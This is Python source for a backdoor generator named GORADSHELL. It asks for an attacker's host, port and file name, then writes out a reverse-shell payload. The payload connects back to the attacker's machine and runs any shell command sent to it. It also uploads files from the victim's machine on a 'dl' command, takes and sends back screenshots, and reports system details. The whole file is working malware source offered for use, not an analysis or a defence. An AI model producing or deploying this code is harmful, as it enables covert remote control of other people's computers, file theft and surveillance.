#================================================#
#GORADSHELL: V 1.0.0
#AUTHOR:cyberGorad 
#DEPOT :https://github.com/cybergorad/goradshell
#TEAM: cybeXus
#================================================#

import time
import os

#FUNCTION
#=========================================

def get_port_number():
    try:
        port = input("[*] RPORT >> ")
        return int(port)
    except Exception :
        get_port_number()
def get_host():
    try:
        host = input("[*] RHOST >> ")
        return str(host)
    except Exception :
        get_host() 

def backdoor_name():
    B_name = input("[*] Name of Backdoor >> ")
    return B_name


host = '"' + str(get_host()) + '"'
port = str(get_port_number())
names = backdoor_name()

#=========================================
content = f"""

import os
import time
import subprocess
import platform
import socket
from PIL import ImageGrab
from colorama import Fore, Style
import pyfiglet
import random 


HOST_IP = {host}
HOST_PORT = {port}
MAX_DATA_SIZE = 1024

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        list_index = [0, 1, 2] #Utilisation des listes 
        error_list = ["[-] ACCESS DENIED , SERVER REFUSING CONNECTION...", "[-] SERVER MAY BE DOWN TRY AGAIN LATER", "[-] DRINK COFFE AND TRY AGAIN LATER :)"]
        error_message = random.choice(list_index)
        print(Fore.RED + error_list[error_message] + Style.RESET_ALL)
        time.sleep(5)
    else:
        print("[+] Connected IP:"  ,HOST_IP + "| HOST_PORT:"  , HOST_PORT)
        break

#reception des commandes du server

while True:        
    commande_data = s.recv(MAX_DATA_SIZE)
    
    if not commande_data:
        break

    commande = commande_data.decode()

    if commande == "exit":
        break

        
    commande_split = commande.split(" ")
#commande pour obtenir les infos du client
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd() 
        reponse = reponse.encode()

    elif commande == "ip":
        commande = "ifconfig".encode()


    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            #redirection vers le repertoire designer
            os.chdir(commande_split[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "ERROR: not found"

        reponse = reponse.encode()

#commande de telechargement
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()

#commande de capture d'ecran avec extension par defaut .png
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        capture_filename = commande_split[1] + ".png"
        capture_ecran.save(capture_filename, "PNG")
        try:
            f = open(capture_filename, "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()


#lecture du ligne de commande 

    else:
       
        result = subprocess.run(commande, shell = True, capture_output= True, universal_newlines= True)
        reponse = result.stdout + result.stderr

        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()
    
    # reponse encode
    data_len = len(reponse)
    header = str(len(reponse)).zfill(13)
    
    s.sendall(header.encode())
    
    if data_len > 0:
        s.sendall(reponse)
   
   
s.close()





"""

try:
    with open(names + ".py", "w") as file:
        file.write(content)
    _names_ = names + ".py"
    
    print("[+] Generating content ... ")
    time.sleep(5)
    print(f"[+] Files created successfully...") 
    print(f"Saved on:{os.getcwd()}/{_names_} .")
except:
    print("Something went wrong..")

